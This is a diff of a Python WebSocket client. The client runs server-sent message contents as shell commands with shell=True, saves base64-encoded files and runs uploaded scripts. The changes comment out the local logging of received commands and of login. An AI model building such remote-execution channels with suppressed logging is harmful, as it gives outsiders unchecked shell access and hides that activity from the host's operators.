@@ -78,10 +78,11 @@ class Client(WebSocketClient):
         try:
             recv_str = m.data.decode('utf-8')
             msg = json.loads(recv_str)
+            
             if self.validate_msg(msg):
-                print (msg)
+                print (msg['type'])
             if msg['type'] == 'reportexe':
-                print("Command received:  " + msg['content'] + "at "+strftime("%Y-%m-%d %H:%M:%S", gmtime()))
+                #print("Command received:  " + msg['content'] + "at "+strftime("%Y-%m-%d %H:%M:%S", gmtime()))
                 p = Popen([msg['content']], stdin=PIPE, shell=True)
                 (output, err) = p.communicate()
                 print("Command executed successfully")
@@ -100,13 +101,13 @@ class Client(WebSocketClient):
             
                 
             if msg['type'] == 'cmd':
-                print("Command received:  " + msg['content'] + "at "+strftime("%Y-%m-%d %H:%M:%S", gmtime()))
+                #print("Command received:  " + msg['content'] + "at "+strftime("%Y-%m-%d %H:%M:%S", gmtime()))
                 p = Popen([msg['content']], stdin=PIPE, shell=True)
                 #(output, err) = p.communicate()
                 print("Command executed successfully")
             
             if msg['type'] == 'save':
-                os.chdir(CConfig.basedir + '/sample/Client')
+                os.chdir(CConfig.dirnm + '/Client')
                 print("Command to save file received")
                 
                 file_content = base64.b64decode(msg['content'])
@@ -116,7 +117,7 @@ class Client(WebSocketClient):
                 
             if msg['type'] == 'execute':
                 
-                uploaddir = CConfig.basedir + '/sample/uploadclient'
+                uploaddir = CConfig.dirnm + '/uploadclient'
                 os.chdir(uploaddir)
                 
                 print("Command to execute script received")
@@ -202,7 +203,7 @@ def web_socket():
     try:
         ws = Client(url, peer_id, protocols=['http-only', 'chat'])
         ws.connect()
-        print("logged in")
+        #print("logged in")
         ws.run_forever()
         print("returning")
         
